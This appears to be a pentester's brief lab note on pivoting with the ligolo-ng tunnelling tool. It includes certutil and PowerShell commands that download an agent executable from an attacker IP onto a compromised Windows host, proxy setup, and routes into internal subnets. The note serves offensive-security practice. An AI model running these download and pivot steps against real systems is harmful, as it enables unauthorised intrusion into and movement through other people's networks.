
download ligolo agent
[Releases · nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) 
```powershell
upload '/home/kali/ligolo-ng/ligolo-agent.exe' 'ligolo-agent.exe'

# wget
certutil -urlcache -split -f http://10.10.15.236:8088/ligolo-agent.exe ligolo-agent.exe

iwr -uri http://10.10.15.236:8088/ligolo-agent.exe -OutFile ligolo-agent.exe
```

```shell
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
 
sudo ./proxy -selfcert -api-laddr 0.0.0.0:8081
```

![](Attachments/Pasted%20image%2020260811105306.png)

connect agent
```shell
.\ligolo-agent.exe ss
```
![](Attachments/Pasted%20image%2020260811123750.png)

add session to ligolo -> start
![](Attachments/Pasted%20image%2020260811124554.png)

ada tunnel
```shell
# kalau banyak network
sudo ip route add 192.168.100.0/24 dev ligolo

# kalau single ip
sudo ip route add 10.129.30.189/32 dev ligolo
```
![](Attachments/Pasted%20image%2020260811125046.png)